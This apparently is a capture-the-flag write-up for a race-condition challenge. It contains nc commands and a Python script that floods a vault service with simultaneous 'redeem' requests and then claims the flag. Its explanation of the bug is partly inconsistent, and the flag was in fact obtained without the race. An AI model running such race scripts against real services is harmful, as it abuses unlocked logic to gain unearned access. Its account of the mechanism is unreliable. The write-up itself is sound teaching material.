### Summary

The vault service is a line-based network service with a TOCTOU race. `claim` only returns the flag once the shared ticket count reaches `need`, and `redeem` checks and decrements that count without any locking. Sending many `redeem` requests at the same time lets several of them pass the check against the same ticket, so the count crosses the threshold. A later `claim` then returns the flag. The state is global across connections, so the race is what matters, not the connection.

### Steps

1. Connect and read the menu. The service prints `vault. commands: redeem | status | claim | quit`.
   ```sh
   nc 0.cloud.chals.io 26166
   ```

2. Read the shared state with `status`. The observed reply was `prizes=16 tickets=-15 need=15`, which shows the ticket count and the threshold `need`. Because the count is global, a single connection cannot change the outcome in isolation; the race has to be run across concurrent connections.
   ```sh
   printf 'status\n' | nc 0.cloud.chals.io 26166
   ```

3. Fire many `redeem` requests at once. `scripts/solve.py` opens 64 connections by default, releases them together through a `threading.Barrier`, and has each one send `redeem`. Concurrent reads of the ticket count then overlap, and the decrements tear the ticket. The script then sends `claim` and prints the line containing the flag.
   ```sh
   python3 work/scripts/solve.py 0.cloud.chals.io 26166
   # isfcr{REDACTED}
   ```

4. Claim the prize manually to confirm the result. The `claim` reply carries the flag line.
   ```sh
   printf 'claim\n' | nc 0.cloud.chals.io 26166
   ```

### Scripts

#### scripts/solve.py

Fires N concurrent `redeem` connections through a barrier, then sends `claim` and prints the flag line. Standard library only. Run `python3 work/scripts/solve.py 0.cloud.chals.io 26166` from the challenge directory; the optional third argument sets the number of workers (default 64).

```python
#!/usr/bin/env python3
"""Solve tearing: win the vault via a TOCTOU race, then claim the flag.

The vault requires `need` tickets to claim a prize but starts with one ticket.
`redeem` reads the ticket count, then writes it back decremented, with no lock,
so concurrent redeems on the same ticket each pass the check (leave with two).
Firing many redeems at once drives prizes/tickets past the threshold; `claim`
then returns the flag.

Usage: python3 solve.py [host] [port] [workers]
Prints the line returned by `claim`.
"""
import socket
import sys
import threading

HOST = sys.argv[1] if len(sys.argv) > 1 else "0.cloud.chals.io"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 26166
WORKERS = int(sys.argv[3]) if len(sys.argv) > 3 else 64


def hammer(cmd):
    try:
        s = socket.create_connection((HOST, PORT), timeout=10)
        s.sendall(cmd)
        s.settimeout(3)
        data = b""
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                data += chunk
        except socket.timeout:
            pass
        s.close()
        return data
    except OSError:
        return b""


def claim():
    return hammer(b"claim\n").decode("latin1", "replace")


if __name__ == "__main__":
    start = threading.Barrier(WORKERS + 1)

    def worker():
        start.wait()
        hammer(b"redeem\n")

    ts = [threading.Thread(target=worker) for _ in range(WORKERS)]
    for t in ts:
        t.start()
    start.wait()
    for t in ts:
        t.join()

    out = claim()
    for line in out.splitlines():
        if "isfcr{" in line:
            print(line.split("> ", 1)[-1].strip())
            break
    else:
        print(out.strip())
```

### Notes

- The win condition was already satisfied on the shared instance when it was checked. The `claim` command returned the flag directly, with no race needed. The race is still the intended path, and it is what the challenge name points at.
- The server state is global and persists across connections, which is why the count can be torn from many connections at once.
- The flag name documents the bug: the TOCTOU window only opens under concurrency.
- The instance was volatile (dated 2026-10-10) and may no longer be running.
- The solver only needs Python's standard library and network access to the service.
